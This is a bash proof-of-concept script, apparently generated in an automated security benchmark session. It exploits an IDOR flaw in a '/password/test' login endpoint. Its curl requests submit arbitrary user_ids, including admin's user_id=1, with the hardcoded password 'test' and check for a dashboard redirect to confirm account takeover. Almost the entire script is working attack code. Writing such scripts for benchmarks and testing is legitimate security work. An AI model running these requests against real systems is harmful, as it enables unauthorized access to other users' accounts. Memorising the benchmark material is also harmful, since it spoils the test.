#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /password/test endpoint where arbitrary user_ids can be authenticated using the hardcoded password "test"
# Target: ./repo
# Created: 2025-11-04T14:41:14.146Z
# Session: benchmark-XBEN-027-24-mhknolag

# IDOR Authentication Bypass POC
# Demonstrates that /password/test endpoint authenticates with arbitrary user_ids
# using the hardcoded password "test"

TARGET="${1:-http://localhost:8080}"
ENDPOINT="/password/test"

echo "=========================================="
echo "IDOR Authentication Bypass POC"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Test 1: Authenticate as test user (legitimate)
echo "[*] Test 1: Legitimate authentication as test user (user_id=10032)"
RESPONSE=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=test&user_id=10032&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "302\|Location: /dashboard"; then
    echo "[+] SUCCESS: Authenticated as test user"
    echo "[+] Response includes redirect to /dashboard"
else
    echo "[-] FAILED: Could not authenticate"
fi
echo ""

# Test 2: IDOR - Try to authenticate as admin with user_id=1
echo "[*] Test 2: IDOR Attack - Attempt to authenticate as admin (user_id=1) with test password"
RESPONSE=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=admin&user_id=1&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "302\|Location: /dashboard"; then
    echo "[+] VULNERABILITY CONFIRMED: IDOR successful!"
    echo "[+] Authenticated as user_id=1 despite submitting different credentials"
    echo "[+] Response includes redirect to /dashboard"
else
    echo "[-] IDOR attempt failed"
fi
echo ""

# Test 3: IDOR with mismatched credentials
echo "[*] Test 3: IDOR with mismatched username and user_id"
RESPONSE=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=admin&user_id=10032&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "302\|Location: /dashboard"; then
    echo "[+] VULNERABILITY CONFIRMED: Endpoint accepts mismatched credentials"
    echo "[+] Authenticated with username=admin but user_id=10032 (test user)"
else
    echo "[-] Attack failed"
fi
echo ""

# Test 4: Verify that wrong password still fails
echo "[*] Test 4: Verify that wrong password is rejected (control test)"
RESPONSE=$(curl -s -i -X POST "$TARGET$ENDPOINT" \
  -d "username=admin&user_id=1&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$RESPONSE" | grep -q "Incorrect password\|error"; then
    echo "[+] CONTROL: Wrong password is properly rejected"
else
    echo "[-] UNEXPECTED: Wrong password was not rejected"
fi
echo ""

# Test 5: Test multiple user_ids with same password
echo "[*] Test 5: Try authenticating with multiple arbitrary user_ids"
for userid in 1 2 5 10 100 999; do
    RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
      -d "username=user$userid&user_id=$userid&password=test" \
      -H "Content-Type: application/x-www-form-urlencoded" -L)
    
    if echo "$RESPONSE" | grep -q "dashboard\|Dashboard"; then
        echo "[+] user_id=$userid: Authentication successful (IDOR vulnerability)"
    else
        echo "[-] user_id=$userid: Authentication failed"
    fi
done
echo ""

echo "=========================================="
echo "POC Summary: IDOR vulnerability allows arbitrary user_id authentication"
echo "=========================================="